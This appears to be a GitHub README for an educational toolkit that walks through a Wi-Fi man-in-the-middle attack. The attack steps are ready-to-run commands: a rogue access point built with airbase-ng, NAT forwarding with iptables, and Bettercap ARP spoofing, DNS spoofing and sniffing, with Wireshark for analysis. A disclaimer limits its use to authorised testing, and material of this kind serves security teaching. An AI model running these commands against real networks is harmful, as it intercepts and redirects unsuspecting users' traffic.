# Wi-Fi-Mirage-The-Illusion-of-Security
Wi-Fi Mirage: An ethical hacking toolkit to create rogue Wi-Fi access points, intercept traffic, and demonstrate network vulnerabilities.


## 🚀 Introduction
Welcome to the ultimate guide on setting up a **Man-in-the-Middle (MITM) Attack** in a controlled environment! This project is designed for educational purposes to demonstrate network vulnerabilities and the power of ethical hacking. Remember, **with great power comes great responsibility**—always have permission before testing any network!

## 🎯 Project Overview
In this project, we’ll create a rogue Wi-Fi access point and use various tools to intercept and analyze network traffic. By following the steps below, you'll learn how to set up a MITM attack, capture packets, and perform DNS spoofing to redirect users.

## 🛠️ Tools Used
- **Aircrack-ng**: A suite of tools for wireless security auditing.
- **Bettercap**: An advanced, powerful, and flexible tool for network attacks and monitoring.
- **Wireshark**: A popular network protocol analyzer for capturing and inspecting packets.
- **iptables**: A user-space utility program for configuring the Linux kernel firewall.

## 🧩 Approaches to MITM
1. **Setting Up a Rogue Access Point**: Use `airbase-ng` to create a fake Wi-Fi network.
2. **Network Sniffing**: Capture packets from the network to analyze traffic.
3. **DNS Spoofing**: Redirect users to malicious sites using Bettercap’s DNS spoofing features.
4. **ARP Spoofing**: Mislead devices into sending their data to your machine instead of the intended destination.

## 📜 Commands Used
Here’s the command lineup for the MITM setup:

### 1. Start Monitor Mode
Make sure your Wi-Fi adapter is ready to capture packets.

```bash
sudo airmon-ng start wlan0
```
![WhatsApp Image 2024-10-06 at 00 32 28_28274e26](https://github.com/user-attachments/assets/481169a9-3d9d-4d27-9af0-f07d9423caec)


### 2. Create the Rogue Wi-Fi Network
Set up a fake Wi-Fi network named "Test-Wifi".

```bash
sudo airbase-ng -e "Test-Wifi" -c 11 wlan0
```

### 3. Configure the Fake Access Point
Bring the interface up and assign it an IP address.

```bash
sudo ifconfig at0 up
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0
```

### 4. Enable Internet Access for Clients
Allow clients connected to our rogue AP to access the internet.

```bash
sudo iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
![WhatsApp Image 2024-10-06 at 00 32 30_fd2c03b7](https://github.com/user-attachments/assets/e71e7926-26b3-48ab-b7a9-eb3c4608079f)

### 5. Start Bettercap
Launch Bettercap with the fake interface.

```bash
sudo bettercap -iface at0
```

### 6. Execute Bettercap Commands
Once inside Bettercap, run the following commands to set up sniffing and spoofing:

```bash
net.probe on
net.show
arp.spoof on
dns.spoof on
net.sniff on
```
![WhatsApp Image 2024-10-06 at 00 36 19_7c453712](https://github.com/user-attachments/assets/5142387b-b5db-414e-ad67-4f7bdb912449)

### 7. Ping
Checking whethere the host is up or not
![WhatsApp Image 2024-10-06 at 00 32 29_3ef2e762](https://github.com/user-attachments/assets/df6194cf-b047-4ac2-b500-23c73279f544)


### 7. Capture and Analyze Traffic
Use Wireshark to analyze captured packets. You can start Wireshark in a separate terminal.

```bash
wireshark
```
![WhatsApp Image 2024-10-06 at 00 32 28_0704eee3](https://github.com/user-attachments/assets/b6623d0d-7c32-49e4-99a2-1aaf91266a65)


## 📱 Mobile Connection Screenshot
![WhatsApp Image 2024-10-06 at 00 32 30_ccc72314](https://github.com/user-attachments/assets/7578e02e-fabb-422b-baf1-f2109657856c)

## ⚠️ Disclaimer
This guide is for educational purposes only. Use the information responsibly and only on networks where you have explicit permission to perform penetration testing. Unauthorized access to networks is illegal and unethical.

## 🙌 Conclusion
This project provides a foundational understanding of network vulnerabilities and ethical hacking. Remember to share your findings and experiences responsibly!
